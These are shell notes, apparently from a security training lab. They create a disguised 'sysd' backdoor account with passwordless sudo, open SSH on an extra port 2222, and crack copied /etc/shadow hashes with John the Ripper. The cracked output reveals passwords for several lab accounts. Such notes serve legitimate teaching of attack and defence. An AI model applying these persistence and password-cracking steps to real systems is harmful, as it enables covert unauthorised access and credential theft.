`sudo groupadd -g 999 sysd`

`useradd -M sysd` OR
`sudo useradd -r -u 999 -g sysd -M -s /bin/bash sysd`

```
sudo passwd sysd
New password:
Retype new password:
passwd: password updated successfully
```

`groupmod -g 400 sysd` 

`sysd ALL=(ALL:ALL) NOPASSWD:ALL`

`john /etc/shadow` 

```
root@fb3a8c482cc7:/home/sysadmin# cat /etc/ssh/sshd_config | grep 22
#	$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $
Port 22
Port 2222
```

`root@fb3a8c482cc7:/home/sysadmin# service ssh restart`

```
sysadmin@ip-10-0-1-161:~/Documents/scavenger-hunt$ ssh sysadmin@192.168.6.105 -p 2222
sysadmin@192.168.6.105's password: 
Last login: Tue Jan 21 02:00:03 2025 from 192.168.6.1

 _________  ________  ________  ________  _______  _________               
|\___   ___\   __  \|\   __  \|\   ____\|\  ___ \|\___   ___\             
\|___ \  \_\ \  \|\  \ \  \|\  \ \  \___|\ \   __/\|___ \  \_|             
     \ \  \ \ \   __  \ \   _  _\ \  \  __\ \  \_|/__  \ \  \              
      \ \  \ \ \  \ \  \ \  \  \ \  \|\  \ \  \_|\ \  \ \  \             
       \ \__\ \ \__\ \__\ \__\ _\ \_______\ \_______\  \ \__\            
        \|__|  \|__|\|__|\|__|\|__|\|_______|\|_______|   \|__|   
 _____ ______   ________  ________  ___  ___  ___  ________   _______      
|\   _ \  _   \|\   __  \|\   ____\|\  \|\  \|\  \|\   ___  \|\  ___ \     
\ \  \\__\ \  \ \  \|\  \ \  \___|\ \  \\  \ \  \ \  \ \  \ \   __/|    
 \ \  \|__| \  \ \   __  \ \  \    \ \   __  \ \  \ \  \ \  \ \  \_|/__  
  \ \  \    \ \  \ \  \ \  \ \  \____\ \  \ \  \ \  \ \  \ \  \ \  \_|\ \ 
   \ \__\    \ \__\ \__\ \__\ \_______\ \__\ \__\ \__\ \__\ \__\ \_______\
    \|__|     \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__| \|__|\|_______|
                                                                
sysadmin@fb3a8c482cc7:~$ 

```

```
unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/unshadowed.txt
root@fb3a8c482cc7:/home/sysadmin# john /tmp/unshadowed.txt 
Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (stallman)
freedom          (babbage)
trustno1         (mitnick)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysd)
passw0rd         (sysadmin)

```